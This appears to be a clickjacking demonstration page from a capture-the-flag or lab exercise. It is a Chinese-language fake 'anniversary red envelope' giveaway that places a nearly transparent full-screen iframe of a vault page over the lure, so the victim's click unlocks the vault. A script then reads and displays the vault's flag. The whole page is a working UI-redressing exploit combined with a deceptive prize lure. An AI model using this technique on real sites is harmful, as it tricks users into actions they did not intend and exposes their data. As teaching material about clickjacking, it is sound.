<!doctype html>
<html lang="zh">
<head>
<meta charset="utf-8">
<title>🎉 星云十一周年 · 领取专属红包</title>
<style>
  body{margin:0;font-family:"Segoe UI","Microsoft YaHei",sans-serif;background:linear-gradient(160deg,#7f1d1d,#dc2626 60%,#f59e0b);min-height:100vh}
  .hero{position:relative;z-index:1;text-align:center;padding-top:60px;color:#fff}
  .hero h1{font-size:34px;margin:0 0 6px;text-shadow:0 2px 6px rgba(0,0,0,.4)}
  .hero p{opacity:.9;margin:4px 0}
  .gift{font-size:70px;margin:18px 0;filter:drop-shadow(0 6px 12px rgba(0,0,0,.35));animation:bounce 1.6s infinite}
  @keyframes bounce{0%,100%{transform:translateY(0)}50%{transform:translateY(-12px)}}
  /* 透明 iframe 盖在整页之上:受害者以为点的是红包,实际点到的是 iframe 里保险箱的巨大解锁按钮 */
  #cloak{position:fixed;inset:0;width:100%;height:100%;opacity:.012;z-index:99;border:0}
  #result{position:fixed;left:0;right:0;bottom:0;z-index:100;background:#111827;color:#fbbf24;padding:14px;font-family:monospace;display:none}
</style>
</head>
<body>
<div class="hero">
  <h1>🎉 星云十一周年庆 🎉</h1>
  <p>限时活动：点击下方礼包，立即领取 <b>188 元</b> 专属红包</p>
  <div class="gift">🧧</div>
  <p style="font-size:20px">（在页面任意处点击即可领取）</p>
</div>
<iframe id="cloak" src="vault.php" title="ad"></iframe>
<div id="result"></div>
<script>
  // 同源 iframe:可以读取其状态——点击"红包"其实点开了保险箱
  setInterval(function () {
    try {
      var f = document.getElementById('cloak');
      var doc = f.contentDocument;
      if (doc && doc.getElementById('vault-flag')) {
        var r = document.getElementById('result');
        r.style.display = 'block';
        r.textContent = '[攻击者页面] 你刚才点开的其实是隐藏的保险箱! 已读取其内容: ' + doc.getElementById('vault-flag').textContent.trim();
      }
    } catch (e) { /* 跨域时读取会被浏览器拦截(本题同源,仅为演示) */ }
  }, 500);
</script>
</body>
</html>
